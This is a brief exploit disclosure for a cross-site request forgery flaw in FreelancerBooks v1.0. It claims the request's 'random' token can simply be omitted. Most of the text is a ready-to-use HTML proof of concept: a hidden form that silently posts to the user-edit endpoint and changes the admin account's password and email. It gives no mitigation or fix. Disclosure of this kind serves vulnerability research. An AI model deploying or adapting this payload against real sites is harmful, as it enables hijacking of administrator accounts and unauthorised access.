There is a vulnerability in the FreelancerBooks v1.0 that allows a crafted page to reset the password of an arbitrary user.

There is a "random" value included as part of the request, but you can just generate the CSRF HTML without that value
and the password will still be changed.

Exploit POC:

````
<html>

  <body>

  <script>history.pushState('', '', '/')</script>

    <form action="http://HOSTNAME/freelancer/freelancer_users_edit.php?submit=1&fly=1&editid1=1&" method="POST" enctype="multipart/form-data">

      <input type="hidden" name="value&#95;username&#95;7" value="admin" />

      <input type="hidden" name="value&#95;password&#95;7" value="admin1234567" />

      <input type="hidden" name="value&#95;email&#95;7" value="test&#64;test&#46;com" />

      <input type="hidden" name="value&#95;fullname&#95;7" value="Admin" />

      <input type="hidden" name="value&#95;groupid&#95;7" value="Admin" />

      <input type="hidden" name="value&#95;active&#95;7" value="1" />

      <input type="hidden" name="parId" value="1" />

      <input type="hidden" name="rowId" value="4" />

      <input type="hidden" name="table" value="freelancer&#95;users" />

      <input type="hidden" name="editType" value="3" />

      <input type="hidden" name="id" value="7" />

      <input type="hidden" name="onFly" value="1" />

      <input type="hidden" name="a" value="edited" />

      <input type="hidden" name="editid1" value="1" />

      <input type="submit" value="Submit request" />

    </form>

  </body>

</html>

````
